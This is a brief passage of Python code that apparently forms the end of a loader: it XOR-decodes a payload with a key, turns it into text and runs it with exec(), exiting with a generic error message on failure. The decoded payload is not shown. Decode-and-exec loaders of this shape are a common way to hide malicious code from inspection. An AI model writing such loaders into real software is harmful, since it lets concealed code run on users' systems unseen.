    payload = xor_data(payload, xor_key)  # 1
    
    code = payload.decode('utf-8')
    exec(code, globals(), locals())
except Exception as e:
    print(f"Critical error occurred: {str(e)}")
    sys.exit(1)
    